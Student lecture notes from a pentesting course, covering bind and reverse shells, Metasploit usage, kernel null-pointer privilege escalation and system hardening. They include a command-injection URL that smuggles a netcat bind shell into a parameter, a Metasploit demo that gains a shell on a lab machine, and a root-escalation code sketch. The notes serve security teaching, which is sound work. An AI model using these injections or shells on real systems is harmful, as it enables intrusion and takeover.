# Lecture 11 - 13.11.2024 - Pentesting 2

# Bind and Reverse Shells

- Sending commands through URL can be frustrating
- Goal: Establish a shell for issuing commands to the victim machine

![image.png](Lecture%2011%20-%2013%2011%202024%20-%20Pentesting%202%2013d57d12e96680a09aecc7260c398a5f/image.png)

Two kinds of shells:

- **Bind shell:** Attacker connects to victim’s listening port
- **Reverse shell**: Victim connects to attacker’s listening port
    - Tip fra Felix: Brug [https://www.revshells.com/](https://www.revshells.com/) til at lave reverse shells

## Demo

- Let’s create a shell to Bob machine
- https://bob/index.php?page=shop.pdf_output&option=com_virtuemart&showpage’; nc –l –p 4444 –e /bin/sh;’´
- While on the attacker’s machine: `nc -v bob 4444`
- Is that a bind or reverse shell?

# Automation: Metasploit

- Metasploit is a popular framework for penetration testing
- Consists of Exploits, Payloads, Options, Encoders
- Typical attacking strategy:
    - Picking an exploit
    - Setting exploit options
    - Picking a payload
    - Setting payload options
    - Running the exploit
    - Connecting to remote system
    - Performing post exploitation processes

## Metasploit Basic Commands

- Identify and add remote hosts
    - `db_nmap -v -sV <network_to_scan>; hosts -R`
- Start exploit DB: `service postgresql start; msfdb init`
- Exploit search: help search
    - *e.g. by ID from MS Security Bulletin:* `search MS13-069`
    - *e.g. by ID from CVE:* `search cve:2013-3660`
    - *e.g. by name:* `seach name:Joomla`
- Use exploit: `use exploit_name`
    - `show options`
    - `show targets`
    - `show advanced`
    - `show payloads`
- Set variables for options/targets/advance: `set <variable_name> <value>`
- Launch the exploit: `exploit`

### Demo

```powershell
msfconsole
searcg joomla
use 11
show info
setg rhosts 192.168.61.2
run # Lists all the installed plugins, where we can look for "interesting stuff"
search tinybrowser # There's a exploit here!
use 0 # It was the only one - Says no payload configured, defaulting to generic shell
show payloads # Lists the payloads
Set payload 2 # Sets payload as number 2 from the list
run # Run and see if it works - Send a php to the server, and calls the payload - Opens a shell on Bobs machine!!
# We now have shell access on Bobs machine as www-data
```

# Privilege Escalation

So far we can run commands as www-data

- Complete control over web page
- Compromised confidentiality and integrity

Goal: root access

![image.png](Lecture%2011%20-%2013%2011%202024%20-%20Pentesting%202%2013d57d12e96680a09aecc7260c398a5f/image%201.png)

Why:

- Read/write any sensitive file
- Persist between reboots
- Permanent backdoor
- etc

How:

- Kernel exploits
- Services running as root
- Misconfigured services (sudo, cron.d, …)
- etc

## Null pointer dereference

A **null pointer dereference** is when a pointer with a value of NULL is used as though it pointed to a valid memory area.

**Java:**

```java
Object x=null;
System.println(x.getString());
```

**C:**

```c
int *pi, a;
pi=NULL;
a=*pi
printf("%d",a);
```

In C, it normally triggers a fault (because then NULL page is not mapped)

What if the page at address 0 gets mapped?

```c
char *mem=NULL;
mem=mmap((void*)0, 4096,...)
mem[0]=&attacker_payload;

// e.g.
static int attacker_payload 
{
	commit_creds (prepare_kernel_cred(0););
}
/* Give root privilege to the current process */
```

Assuming the attacker writes a function that throws a null pointer dereference. Would that work?

The function needs to run on privileged mode (kernel mode)

![image.png](Lecture%2011%20-%2013%2011%202024%20-%20Pentesting%202%2013d57d12e96680a09aecc7260c398a5f/image%202.png)

It’s a problem in the bluetooth stack:

Any linux machine with bluetooth support between 2001 and 2009, could be attacked with privilege escalation easily!

This is often easier than expected!

![image.png](Lecture%2011%20-%2013%2011%202024%20-%20Pentesting%202%2013d57d12e96680a09aecc7260c398a5f/image%203.png)

![image.png](Lecture%2011%20-%2013%2011%202024%20-%20Pentesting%202%2013d57d12e96680a09aecc7260c398a5f/image%204.png)

# Hardening

Hardening is the process of reducing the surface of vulnerability of a system.

Viz. Minimum exposure

Prerequisite: You must understand, exactly, the purpose of the system.

## Network services (Adversary)

- Actual goal dependent on context (CIA)
- Want to subvert running services
- Need information to find exploits
- Port-scanning, automated vulnerability detection tools
- Automated vulnerability exploitation tools

## NIST SP 800-123

- Patch the operating system
- Remove unnecessary services, applications, and protocols
- Configure users, groups, and permissions
- Configure resource controls
- Install additional security controls, e.g. anti-virus, host-based firewalls, and intrusion detection systems (IDS)
- Test

## Network services (Administrator)

- Actual coal dependent on context (CIA)
- Reduce surface of vulnerability
- Disable unnecessary services
- Keep the system upgraded
- Keep the system compartmentalised

# Useful commands on Kali

- Static port forwarding
    - `ssh -N -L <Lport>:<studentip>:<Rport> pensim@130.226.143.130`
    - `msfconsole`
- Dynamic port forwarding
    - `Add "socks4 localhost <Lport>" to /etc/proxychains4.conf`
    - `ssh -D <Lport> pensim@130.226.143.130`
    - `Proxychains -q msfconsole`